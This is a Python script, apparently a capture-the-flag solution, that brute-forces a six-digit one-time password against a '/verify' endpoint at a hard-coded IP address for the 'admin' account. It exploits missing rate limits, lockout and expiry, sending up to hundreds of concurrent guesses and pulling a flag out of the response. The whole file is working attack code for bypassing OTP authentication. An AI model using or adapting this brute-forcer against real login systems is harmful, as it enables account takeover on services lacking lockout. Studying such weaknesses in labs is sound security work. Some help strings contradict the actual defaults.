#!/usr/bin/env python3
import atexit
atexit.register(lambda: print("作者 ZluxYao"))
# 36-logic-otp-no-limit  —  OTP 暴力枚举（无速率限制 / 无锁定）
# 漏洞：6 位数字 OTP（10^6 空间）+ /verify 无失败计数 / 无 IP 限速 / 无 OTP 过期
#
# 用法：
#   python3 main.py                          # 默认：先试 424030（已知命中）→ 失败再随机扫
#   python3 main.py --order seq              # 顺序 0 → 999999
#   python3 main.py --order reverse          # 倒序 999999 → 0
#   python3 main.py --order rand --seed 42   # 自定义随机种子
#   python3 main.py --first 424030,123456    # 自定义优先尝试列表
#   python3 main.py --concurrency 300        # 自定义并发
import argparse, asyncio, httpx, random, re, time

BASE = "http://47.120.76.57:34961"
USER = "admin"
TOTAL = 1_000_000
DEFAULT_FIRST = [424030]   # 已知命中（本机首次跑出的 OTP），默认优先尝试

found = asyncio.Event()
result = {}

def build_order(mode: str, seed: int, first: list[int]) -> list[int]:
    """根据模式构造枚举序列；first 中的 OTP 会被前置（去重）"""
    if mode == "seq":
        base = list(range(TOTAL))
    elif mode == "reverse":
        base = list(range(TOTAL - 1, -1, -1))
    elif mode == "rand":
        base = list(range(TOTAL))
        random.Random(seed).shuffle(base)
    else:
        raise ValueError(f"unknown order mode: {mode}")
    seen = set(first)
    return list(first) + [x for x in base if x not in seen]

async def try_otp(client, sem, otp_int, counter):
    if found.is_set():
        return
    otp = f"{otp_int:06d}"
    async with sem:
        try:
            r = await client.post(f"{BASE}/verify",
                                  data={"username": USER, "otp": otp},
                                  follow_redirects=True)
        except Exception:
            return
    counter[0] += 1
    if counter[0] % 2000 == 0:
        dt = time.time() - counter[1]
        print(f"[{counter[0]:>7}] {dt:6.1f}s  rate={counter[0]/dt:5.0f}/s  try={otp}", flush=True)
    if r.status_code == 200 and ("flag{" in r.text.lower() or "togogo" in r.text.lower()):
        result["otp"] = otp
        result["body"] = r.text
        found.set()

async def main(args):
    first = [int(x) for x in args.first.split(",") if x.strip()] if args.first else list(DEFAULT_FIRST)
    order = build_order(args.order, args.seed, first)
    print(f"[*] mode={args.order} seed={args.seed} first={first} concurrency={args.concurrency}")

    limits = httpx.Limits(max_connections=args.concurrency,
                          max_keepalive_connections=args.concurrency)
    sem = asyncio.Semaphore(args.concurrency)
    counter = [0, time.time()]

    async with httpx.AsyncClient(limits=limits, timeout=15) as client:
        # 先串行打 first 列表（命中通常 < 0.5s 完成）
        for n in first:
            if found.is_set():
                break
            await try_otp(client, sem, n, counter)
        if found.is_set():
            print(f"[+] fast-path 命中 first={first}", flush=True)

        # 主枚举
        tasks = []
        for n in order[len(first):]:
            if found.is_set():
                break
            tasks.append(asyncio.create_task(try_otp(client, sem, n, counter)))
            if len(tasks) >= args.concurrency * 4:
                _, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
                tasks = list(pending)
        if tasks and not found.is_set():
            await asyncio.gather(*tasks, return_exceptions=True)

    if "otp" in result:
        print(f"\n[+] HIT otp={result['otp']}")
        m = re.search(r"(TOGOGO-flag\{[^}]+\}|flag\{[^}]+\})", result["body"], re.I)
        if m:
            print(f"[+] FLAG = {m.group(1)}")
        else:
            print(f"[+] BODY (first 500B):\n{result['body'][:500]}")
    else:
        print("[-] 未命中（枚举完毕）")

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--order", choices=["seq", "reverse", "rand"], default="seq",
                   help="枚举顺序：seq=正序 / reverse=倒序 / rand=随机（默认）")
    p.add_argument("--seed", type=lambda x: int(x, 0), default=0xC0DE,
                   help="rand 模式的随机种子，默认 0xC0DE（与首次命中复现一致）")
    p.add_argument("--first", type=str, default=None,
                   help=f"优先尝试的 OTP 列表，逗号分隔；默认 {DEFAULT_FIRST}")
    p.add_argument("--concurrency", type=int, default=500, help="并发数（默认 200）")
    asyncio.run(main(p.parse_args()))
